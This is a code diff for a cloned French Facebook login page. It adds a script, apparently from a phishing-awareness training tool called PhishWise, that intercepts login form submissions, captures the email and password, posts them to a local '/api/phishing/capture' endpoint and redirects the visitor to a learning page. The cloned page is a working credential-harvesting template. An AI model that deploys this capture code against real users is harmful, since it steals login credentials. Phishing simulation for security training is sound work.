@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr" id="facebook" class="no_js">
-<head>
+<!DOCTYPE html><html lang="fr" id="facebook" class="no_js"><head>
     <meta charset="utf-8">
     <meta name="referrer" content="default" id="meta_referrer">
     <title>Facebook - Connectez-vous ou inscrivez-vous</title>
@@ -393,13 +391,13 @@
                     <h2 class="_8icy">Facebook vous aide à communiquer et à partager avec les personnes de votre entourage.</h2>
                 </div>
                 <div class="_8esp">
-                    <form class="_6luv" id="login-form" method="POST" action="#" novalidate>
+                    <form class="_6luv" id="login-form" method="POST" action="#" novalidate="">
                         <div class="_6lux">
-                            <input type="text" class="_6luy" name="email" id="email" placeholder="Adresse e-mail ou numéro de tél." autocomplete="username" required tabindex="1">
+                            <input type="text" class="_6luy" name="email" id="email" placeholder="Adresse e-mail ou numéro de tél." autocomplete="username" required="" tabindex="1">
                             <div class="error-message" id="email-error" style="display: none;"></div>
                         </div>
                         <div class="_6lux">
-                            <input type="password" class="_6luy" name="pass" id="pass" placeholder="Mot de passe" autocomplete="current-password" required tabindex="2">
+                            <input type="password" class="_6luy" name="pass" id="pass" placeholder="Mot de passe" autocomplete="current-password" required="" tabindex="2">
                             <div class="error-message" id="pass-error" style="display: none;"></div>
                         </div>
                         <button type="submit" class="_42ft" id="login-btn" tabindex="4">
@@ -721,5 +719,125 @@
 
         console.log('✅ Script Facebook avec redirection chargé');
     </script>
-</body>
-</html> 
+
+ 
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68ae397867d3cb55148e80c3';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68ae397867d3cb55148e80c3';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68ae397867d3cb55148e80c3';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68ae397867d3cb55148e80c3',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
